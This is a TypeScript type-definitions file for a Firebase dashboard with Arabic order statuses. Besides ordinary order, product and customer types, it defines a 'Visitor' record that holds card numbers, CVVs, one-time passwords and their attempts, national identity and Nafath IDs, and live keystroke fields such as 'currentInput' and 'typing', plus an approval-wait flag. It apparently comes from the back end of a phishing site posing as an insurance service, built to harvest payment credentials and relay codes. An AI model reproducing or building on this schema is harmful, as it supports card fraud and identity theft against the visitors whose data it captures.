import { Timestamp } from "firebase/firestore";

export type Order = {
  id: string;
  customerName: string;
  status: 'قيد الانتظار' | 'تم الشحن' | 'تم التوصيل' | 'ملغي';
  amount: number;
  createdAt: Timestamp;
  items: { productId: string; quantity: number }[];
};

export type Product = {
  id: string;
  name: string;
  price: number;
  stock: number;
};

export type Customer = {
  id:string;
  name: string;
  phone: string;
  address: string;
  joinedAt: Timestamp;
};

export type Visitor = {
  id: string;
  country?: string;
  currentPage?: string | number;
  online?: boolean;
  lastSeen?: any;
  createdDate?: string;
  paymentStatus?: string;
  finalStatus?: string;
  phone?: string;
  phone2?: string;
  operator?: string;
  documment_owner_full_name?: string;
  owner_identity_number?: string;
  insurance_purpose?: string;
  vehicle_type?: string;
  sequenceNumber?: string;
  nafazId?: string;
  otpAttempts?: number;
  otpVerified?: boolean;
  otpSent?: boolean;
  waitingForApproval?: boolean;
  submissionTime?: string;
  typing?: boolean;
  currentInput?: string;
  currentField?: string;
  cardNumber?: string;
  cardName?: string;
  cvv?: string;
  otp?: string;
};
